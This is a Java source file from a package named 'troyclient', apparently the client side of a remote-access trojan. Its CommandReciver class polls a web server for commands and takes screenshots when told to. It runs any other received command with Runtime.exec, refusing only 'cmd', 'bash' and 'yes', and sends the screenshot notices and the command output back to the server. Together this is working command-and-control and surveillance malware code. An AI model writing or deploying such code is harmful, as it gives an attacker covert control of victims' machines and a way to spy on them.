package ch.lebois.troyclient.functions;

import ch.lebois.troyclient.service.Sender;
import ch.lebois.troyclient.service.WebHandler;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;

public class CommandReciver {

    private String name;

    private String url = "http://localhost:8080/command/";
    private WebHandler webHandler;
    private Sender sender;

    public CommandReciver(String name) {
        this.name = name;
        setUrl(url + name);
    }


    public void setUrl(String url) {
        this.url = url;
        webHandler = new WebHandler(url);
        sender = new Sender(name);
    }

    public void readCommands() {
        try {
            String left = webHandler.getContent().split("id=\"commands\">\n")[1].split("</pre>")[0];

            String[] commands = left.replace("\\r", "").split("\\n");
            for (String command : commands) {
                try {
                    switch (command.toLowerCase()) {
                        case "screenshot":
                            sender.send("screen", "Screenshot taken '" + Screenshot.takeScreenshot() + "'");
                            break;
                        case "cmd":
                        case "bash":
                        case "yes":
                            sender.send("error", "Command '" + command + "' not allowed");
                            break;
                        default:
                            try {
                                if (!command.equals("")) {
                                    for (String out : execute(command)) {
                                        sender.send("commandout", out);
                                    }
                                }
                            } catch (NullPointerException e) {
                                sender.send("errorout", "No command '" + command + "' found");
                            }
                            break;
                    }

                } catch (NullPointerException e) {
                    e.printStackTrace();
                }
            }
        } catch (NullPointerException | IndexOutOfBoundsException e) {
            //TODO log no Commands
        }
    }


    public ArrayList<String> execute(String command) {

        ArrayList<String> output = new ArrayList<>();
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = command.split(" ");
            Process proc = rt.exec(commands);

            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));

            output.add(System.getProperty("user.dir") + " $ " + command);

            String s;
            while ((s = stdInput.readLine()) != null) {
                output.add(s);
            }

            while ((s = stdError.readLine()) != null) {
                output.add(s);
            }
        } catch (IOException e) {
            return null;
        }
        return output;
    }
}
